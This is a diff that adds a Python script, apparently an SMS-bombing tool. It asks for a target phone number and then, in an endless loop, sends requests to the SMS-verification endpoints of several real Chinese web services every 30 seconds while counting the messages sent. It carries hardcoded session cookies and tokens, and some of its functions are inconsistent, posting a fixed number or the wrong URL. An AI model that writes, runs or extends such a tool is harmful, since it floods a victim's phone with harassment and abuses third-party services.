@@ -1,0 +1,97 @@
+import requests
+import json
+import re
+import time
+
+def checkphone():
+    global phone
+    phone =input("请输入目标电话:")
+    result = re.match(r'^1[35789]\d{9}$', phone)
+    if not result:
+        print("请输入正确的电话号码!")
+        checkphone()
+
+def ilab():
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+                   'Cookie': 'acw_tc=65c86a0c15714103591818049efcfd32128dbf239bea9b06705c5ad82343c7',
+                   'Referer': 'http://www.ilab-x.com/register'}
+        r = requests.post('http://www.ilab-x.com/sms/api/send',
+                          data=json.dumps({"phone": "{}".format(phone), "action": "0", "id": "-1"}), headers=headers)
+        print(r.text)
+        print(r.status_code)
+    except:
+        print("请求失败!")
+
+
+def mubu():
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+                   'Cookie': 'csrf_token=2d2fc888-40c9-4db3-b999-26f87c34640f; data_unique_id=9e2b6bfd-9e68-4239-8024-4fbe40f7b521; SESSION=YzY5YjMxN2QtOGExZC00NjVlLTk3NWItOGNiNDc4ZTVmYWJh; reg_entrance=https%3A%2F%2Fmubu.com%2Freg; reg_prepareId=16ddf7b4b17-16ddf7b4974-4545-ae49-00884e01f806; reg_focusId=0aab8fe5-0ee4-4545-ae49-16ddf7b6461',
+                   'Referer': 'https://mubu.com/reg'}
+        r = requests.post('https://mubu.com/api/reg/send_sms_code',
+                          data=json.dumps({"sendId": "0aab8fe5-0ee4-4545-ae49-00884e01f806", "phone": "{}".format(phone)}), headers=headers)
+        print(r.text)
+        print(r.status_code)
+    except:
+        print("请求失败!")
+
+def ones():
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+                   'Cookie': 'TY_SESSION_ID=481212fb-61eb-4558-b943-a032016decfc; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216ddf89be3452-0a2a6000b479888-4c312373-2073600-16ddf89be3527f%22%2C%22%24device_id%22%3A%2216ddf89be3452-0a2a6000b479888-4c312373-2073600-16ddf89be3527f%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%7D; sajssdk_2015_cross_new_user=1',
+                   'Referer': 'https://ones.ai/sign_up.html?s=0'}
+        r = requests.post('https://ones.ai/api/project/auth/verify_sms',
+                          data=json.dumps({"phone": "+86{}".format(phone)}), headers=headers)
+        print(r.text)
+        print(r.status_code)
+    except:
+        print("请求失败!")
+
+
+def xinlang():
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+                   'Cookie': 'login=762f3e0dcc5502a5a40c3e2ed4c43e11; ULOGIN_IMG=gz-16f357fcbf7755042b48c1fedfe949cfa6e3',
+                   'Referer': 'https://login.sina.com.cn/signup/signup?entry=account'}
+        r = requests.post('https://login.sina.com.cn/signup/check_user.php',
+                          data=json.dumps({"name": "17377430991", "format": "json", "from": "mobile"}), headers=headers)
+        print(r.text)
+        print(r.status_code)
+    except:
+        print("请求失败!")
+
+def itjuzi():
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+                   'Cookie': ' _ga=GA1.2.1839477772.1571706899; _gid=GA1.2.1135913440.1571706899; Hm_lvt_1c587ad486cdb6b962e94fc2002edf89=1571706901; Hm_lpvt_1c587ad486cdb6b962e94fc2002edf89=1571706934',
+                   'Referer': 'https://www.itjuzi.com/user/'}
+        time_now = int(time.time() * 1000)
+        r = requests.post('https://login.sina.com.cn/signup/check_user.php',
+                          data=json.dumps({"mobile": "17377430991", "click_time": str(time_now), "token": "0641258293a4b7b014ff5750238072b0e390e9d2"}), headers=headers)
+        print(r.text)
+        print(r.status_code)
+    except:
+        print("请求失败!")
+
+def checkNumber():
+    global num
+    num += 3
+    print("已成功发送{}次".format(num))
+
+
+
+if __name__ == '__main__':
+    global phone
+    global num
+    num = 0
+    checkphone()
+    while True:
+        ilab()
+        mubu()
+        ones()
+        xinlang()
+        checkNumber()
+        time.sleep(30)
+
+
